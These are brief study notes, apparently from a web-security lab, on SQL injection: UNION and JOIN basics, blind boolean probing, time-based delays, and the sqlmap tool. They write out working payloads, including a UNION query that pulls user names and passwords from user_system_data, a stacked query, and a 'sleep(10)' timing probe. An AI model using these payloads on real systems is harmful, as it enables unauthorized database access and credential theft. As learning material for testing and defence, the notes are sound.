-Combining SQL injection Techniques

Union
The Union operator is used, to combine the results of two or more SELECT Statements.

Joins
The Join operator is used to combine rows from two or more tables, based on a related column
SELECT * FROM user_data INNER JOIN user_data_tan ON user_data.userid=user_data_tan.userid;

1. '; SELECT * FROM user_system_data WHERE '1'='1'; --
2. Smith' UNION SELECT userid,user_name, password, 'a', 'b', 'c', 1 from user_system_data --

-Blind SQL injection

when the application does not reflect the information directly on the web page.
you will need to start asking the database questions based on a true or false statement.

example:
request: https://my-shop.com?article=4
SQL query: SELECT * FROM articles WHERE article_id = 4

request: https://my-shop.com?article=4  and 1=1
SQL query: SELECT * FROM articles WHERE article_id = 4 and 1 = 1

when the results above returns the same page, then this page is vulnerable to bind SQL attacks, else, it will return page not found
Further, we can ask database for some information like
ex:
https://shop.example.com?article=4 AND substring(database_version(),1,1) = 2
which asks the database version and the type of the database and base on the database type we can do some normal SQL attacks

-time-based SQL injection (when you are totally blind)
article = 4; sleep(10) --

-sqlmap

A python library that automate the sqli process, one can use --proxy [burp suite proxy] to intercept sqlmap request to the server
